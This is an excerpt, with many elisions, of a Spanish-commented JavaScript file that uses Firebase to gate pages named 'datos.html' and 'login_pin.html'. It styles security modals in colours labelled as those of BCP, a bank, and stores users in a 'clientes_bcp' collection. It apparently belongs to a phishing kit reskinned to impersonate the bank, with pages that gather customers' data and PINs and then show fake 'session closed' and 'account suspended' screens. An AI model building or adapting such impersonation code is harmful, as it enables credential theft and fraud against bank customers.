// seguridad.js - MODO VELOCIDAD Y PERSISTENCIA (VERSIÓN BCP)
import { auth, db } from "./firebase.js";
import { onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
import { doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// 1. DEFINIMOS LAS PUERTAS PRINCIPALES (Ajustado para BCP)
const paginaActual = window.location.pathname;
const esPuertaPrincipal = paginaActual.includes("datos.html") || paginaActual.includes("login_pin.html");
...
// Estilos de los modales de seguridad (COLORES BCP)
...
style.textContent = `
    ...
    .seguridad-icon { font-size: 55px; color: #002A8D; margin-bottom: 20px; } /* Azul BCP */
    .seguridad-title { font-size: 20px; font-weight: 700; color: #002A8D; margin-bottom: 12px; } /* Azul BCP */
    .seguridad-text { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.6; }
    .btn-soporte { background-color: #FF7800; color: white; border: none; width: 100%; padding: 15px; border-radius: 25px; font-size: 16px; font-weight: 700; cursor: pointer; display: block; text-decoration: none; margin-bottom: 12px; transition: 0.2s; } /* Naranja BCP */
    .btn-soporte:active { transform: scale(0.97); }
...
// EXPULSIÓN DEFINITIVA (Limpia rastros y cierra sesión)
...
onAuthStateChanged(auth, async (user) => {
    ...
    // Si el usuario ya está logueado y su pase está activo, lo sacamos del index al PIN.
    if (esIndex && localStorage.getItem("pase_vip_activo") === "true") {
        window.location.href = "login_pin.html"; 
        return;
    }

    // Si NO estamos en una puerta principal, dejamos que navegue rápido
    ...
    try {
        // AQUÍ LA MAGIA: Apuntamos a la carpeta correcta del BCP
        const userRef = doc(db, "clientes_bcp", user.email);
                ...
                document.body.innerHTML = `
                    <div class="seguridad-overlay">
                        <div class="seguridad-card">
                            ...
                            <div class="seguridad-title" style="color: #ef4444;">Sesión Cerrada</div>
                ...
                document.body.innerHTML = `
                    <div class="seguridad-overlay">
                        <div class="seguridad-card">
                            ...
                            <div class="seguridad-title">¡Cuenta suspendida!</div>
